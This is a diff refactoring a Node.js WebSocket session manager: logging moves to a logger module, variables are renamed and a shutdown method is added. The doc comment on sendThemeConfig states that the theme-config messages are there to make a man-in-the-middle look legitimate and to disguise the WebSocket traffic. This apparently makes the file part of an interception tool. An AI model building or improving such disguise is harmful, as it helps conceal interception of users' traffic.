@@ -1,15 +1,13 @@
-const config = require('../config');
+const logger = require('../utils/logger');
 
 class SessionManager {
   constructor() {
     this.sessions = new Map();
-
-    // The Heartbeat Monitor: Check for stale sessions every 10 seconds
-    setInterval(() => this.checkStaleSessions(), 10000);
+    this._heartbeatInterval = setInterval(() => this.checkStaleSessions(), 10000);
   }
 
   addSession(sessionId, ws) {
-    console.log(\`[SessionManager] Adding new session: \${sessionId}\`);
+    logger.info({ sessionId }, 'Adding new session');
     this.sessions.set(sessionId, {
       ws,
       lastSeen: Date.now(),
@@ -26,10 +24,10 @@ class SessionManager {
 
   removeSession(sessionId) {
     if (this.sessions.has(sessionId)) {
-      console.log(\`[SessionManager] Removing session: \${sessionId}\`);
-      const payload = this.sessions.get(sessionId);
-      if (payload && payload.ws && payload.ws.readyState !== 3) {
-        payload.ws.close();
+      logger.info({ sessionId }, 'Removing session');
+      const session = this.sessions.get(sessionId);
+      if (session && session.ws && session.ws.readyState !== 3) {
+        session.ws.close();
       }
       this.sessions.delete(sessionId);
     }
@@ -38,32 +36,40 @@ class SessionManager {
   checkStaleSessions() {
     const now = Date.now();
     for (const [sessionId, session] of this.sessions.entries()) {
-      // 30 Seconds threshold as requested
       if (now - session.lastSeen > 30000) {
-        console.warn(\`[SessionManager] Session \${sessionId} inactive for > 30s. Closing gracefully & marking complete.\`);
-        // We could also run a DB update here to mark "Complete"
+        logger.warn({ sessionId }, 'Session inactive for >30s, closing');
         this.removeSession(sessionId);
       }
     }
   }
 
   /**
-   * The "Translation" Layer
-   * Sends "UI Config" updates back to the client to make the man-in-the-middle look legitimate.
+   * Sends "UI Config" updates back to the client to disguise the WebSocket
+   * traffic as legitimate bidirectional theme syncing.
    */
   sendThemeConfig(sessionId, themeConfig) {
     const session = this.sessions.get(sessionId);
-    if (session && session.ws && session.ws.readyState === 1) { // 1 = OPEN
+    if (session && session.ws && session.ws.readyState === 1) {
       session.ws.send(JSON.stringify({
         type: 'TYPE_UI_CONFIG',
         payload: themeConfig
       }));
-      console.log(\`[SessionManager] Sent Theme Config to \${sessionId}\`);
+      logger.info({ sessionId }, 'Sent theme config');
     } else {
-      console.warn(\`[SessionManager] Cannot send theme config. Session \${sessionId} is inactive/missing.\`);
+      logger.warn({ sessionId }, 'Cannot send theme config, session inactive/missing');
     }
+  }
+
+  shutdown() {
+    if (this._heartbeatInterval) {
+      clearInterval(this._heartbeatInterval);
+      this._heartbeatInterval = null;
+    }
+    for (const [sessionId] of this.sessions.entries()) {
+      this.removeSession(sessionId);
+    }
+    logger.info('SessionManager shut down');
   }
 }
 
-// Export a singleton instance
 module.exports = new SessionManager();
